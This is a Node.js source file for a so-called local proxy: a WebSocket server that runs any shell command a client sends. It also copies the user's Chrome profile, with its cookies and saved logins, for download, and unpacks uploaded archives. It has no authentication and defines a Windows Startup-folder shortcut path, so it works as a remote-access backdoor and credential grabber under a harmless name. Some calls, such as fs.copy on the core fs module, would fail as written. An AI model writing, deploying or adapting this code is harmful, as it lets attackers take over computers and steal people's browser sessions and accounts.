const WebSocket = require("ws");
const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const multer = require("multer");
const { exec } = require("child_process");
const fs = require("fs");
const path = require("path");
const os = require("os");
const { spawn } = require('child_process');
const unzipper = require("unzipper");

async function extractZip(zipPath, extractPath) {
    return new Promise((resolve, reject) => {
        fs.createReadStream(zipPath)
            .pipe(unzipper.Extract({ path: extractPath }))
            .on("close", () => {
                console.log(`✅ Extracted: ${extractPath}`);
                resolve();
            })
            .on("error", reject);
    });
}

const PORT = 3254;

let extractPath;

const CHROME_DIR = path.join(process.env.LOCALAPPDATA, "ChromePortable");
const CHROME_EXEC = path.join(CHROME_DIR, "GoogleChromePortable.exe");

// 🔹 Use a writable directory instead of `__dirname`
const BASE_DIR = path.join(os.tmpdir(), "localproxy");
const UPLOAD_DIR = path.join(BASE_DIR, "uploads");

process.env.UPLOAD_DIR = UPLOAD_DIR;

console.log(`📂 UPLOAD_DIR set to: ${process.env.UPLOAD_DIR}`);

const startupFolder = path.join(os.homedir(), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup");
const shortcutPath = path.join(startupFolder, "LocalProxy.lnk");

// ✅ Ensure directories exist (outside the snapshot)
if (!fs.existsSync(BASE_DIR)) fs.mkdirSync(BASE_DIR, { recursive: true });
if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR, { recursive: true });

console.log(`UPLOAD_DIR: ${UPLOAD_DIR}`);

const extensionZip = path.join(UPLOAD_DIR, "ovlf-extension.zip");
const extensionDir = path.join(UPLOAD_DIR, "ovlf-extension");

// 🔹 File Upload Setup
const upload = multer({ dest: UPLOAD_DIR });

// 🔹 WebSocket Server
const wss = new WebSocket.Server({ port: PORT });

function executeCommand(command, ws) {
    console.log("🚀 EXECUTING CMD:", command);

    const commandRepl = command.replace(/%UPLOAD_DIR%/g, UPLOAD_DIR);

    console.log("📜 CMD (After Substitution):", commandRepl);

    // Split the command for proper execution
    const commandParts = commandRepl.split(" ");
    const mainCommand = commandParts.shift(); // First word is the actual command
    const args = commandParts; // Remaining are arguments

    // Use spawn to run commands properly
    const process = spawn(mainCommand, args, { shell: true });

    process.stdout.on("data", (data) => {
        console.log(`📜 STDOUT: ${data.toString().trim()}`);
        ws.send(JSON.stringify({ success: data.toString().trim() }));
    });

    process.stderr.on("data", (data) => {
        console.error(`⚠️ STDERR: ${data.toString().trim()}`);
        ws.send(JSON.stringify({ error: data.toString().trim() }));
    });

    process.on("close", (code) => {
        console.log(`✅ Process exited with code ${code}`);
        ws.send(JSON.stringify({ success: `Process exited with code ${code}` }));
    });

    process.on("error", (err) => {
        console.error(`❌ Process failed: ${err.message}`);
        ws.send(JSON.stringify({ error: err.message }));
    });

    console.log("✅ FINISHED EXECUTING CMD (Process Running)");
}

wss.on("connection", (ws) => {
    console.log("🔗 WebSocket client connected");

    // 🔹 Keep Connection Alive (Ping-Pong)
    ws.isAlive = true;

    ws.on("pong", () => {
        ws.isAlive = true;
    });

    // 🔹 Handle Incoming Messages
    ws.on("message", (message) => {
        console.log("📩 Received:", message);
        ws.send(JSON.stringify({ response: "pong" }));
    });

    ws.on("close", () => console.log("🔌 WebSocket client disconnected"));

    ws.on("message", async (message) => {
        try {
            const data = JSON.parse(message);
            console.log("📩 Received:", data);

            if (data.command) {
                console.log(`STARTING CMD: ${data.command}`);
                executeCommand(data.command, ws);
            } else if (data.action === "copy-user-profile") {
                try {
                    // Get the default Chrome user profile path
                    const userProfileDir = path.join(os.homedir(), "AppData", "Local", "Google", "Chrome", "User Data", "Default");
                    const profileCopyDir = path.join(UPLOAD_DIR, "chrome_profile_copy");

                    console.log(`📂 Copying Chrome profile from: ${userProfileDir} -> ${profileCopyDir}`);

                    // Copy profile directory
                    await fs.copy(userProfileDir, profileCopyDir, { overwrite: true });

                    console.log("✅ Chrome profile copied successfully!");

                    // Send back success response with profile path
                    ws.send(JSON.stringify({ 
                        action: "copy-user-profile", 
                        status: "OK", 
                        message: "Profile copied", 
                        profilePath: profileCopyDir 
                    }));
                } catch (error) {
                    console.error("❌ Error copying profile:", error);
                    ws.send(JSON.stringify({ 
                        action: "copy-user-profile", 
                        status: "NOK", 
                        message: "Failed to copy profile", 
                        error: error.message 
                    }));
                }
            } else if (data.action === "upload") {
                const { filename, content } = data;
                if (!filename || !content) return ws.send(JSON.stringify({ error: "Invalid upload request" }));

                const zipPath = path.join(UPLOAD_DIR, filename);
                extractPath = path.join(UPLOAD_DIR, path.parse(filename).name); // Extract to folder with same name

                // Save ZIP file
                fs.writeFileSync(zipPath, Buffer.from(content, "base64"));
                console.log(`✅ File saved: ${zipPath}`);

                // Extract ZIP automatically
                await extractZip(zipPath, extractPath);

                // Optionally delete ZIP after extraction
                fs.unlinkSync(zipPath);

                ws.send(JSON.stringify({ success: `Extracted to ${extractPath}` }));

            } else if (data.action === "download") {
                // 🔹 Send File for Download
                const filePath = path.join(UPLOAD_DIR, data.filename);
                if (!fs.existsSync(filePath)) return ws.send(JSON.stringify({ error: "File not found" }));

                const fileData = fs.readFileSync(filePath).toString("base64");
                ws.send(JSON.stringify({ action: "download", filename: data.filename, content: fileData }));
            }
        } catch (err) {
            ws.send(JSON.stringify({ error: "Invalid JSON format" }));
        }
    });

    ws.on("close", () => console.log("🔌 WebSocket client disconnected"));
});

setInterval(() => {
    wss.clients.forEach((ws) => {
        if (!ws.isAlive) return ws.terminate(); // Remove dead connections
        ws.isAlive = false;
        ws.ping();
    });
}, 30000)

console.log(`🌐 WebSocket proxy running on ws://localhost:${PORT}`);
console.log("🔍 Proxy Running in Directory:", process.cwd());
